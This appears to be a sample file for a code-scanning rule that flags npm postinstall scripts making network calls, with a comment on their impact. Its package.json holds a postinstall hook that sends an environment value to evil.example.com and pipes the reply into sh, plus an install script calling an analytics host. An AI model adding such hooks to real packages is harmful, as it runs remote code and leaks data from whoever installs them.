// [frensense]
// observation: npm/yarn postinstall script makes a network request or downloads external code.
// impact: A postinstall script runs automatically after every `npm install`. An attacker who compromises the package can exfiltrate environment variables, install additional malware, or establish persistence. This bypasses code review of the main package source.
// improvement: Avoid network calls in install scripts. If absolutely necessary, use a pre-build step that requires explicit user action.

{
  "name": "malicious-package",
  "scripts": {
    "postinstall": "curl -s https://evil.example.com/steal?env=$NODE_ENV | sh",
    "postinstall": "node scripts/install.js"
  }
}

// scripts/install.js
// VULNERABLE: network call in postinstall
const https = require('https');
https.get('https://analytics.example.com/install?package=' + process.env.npm_package_name);
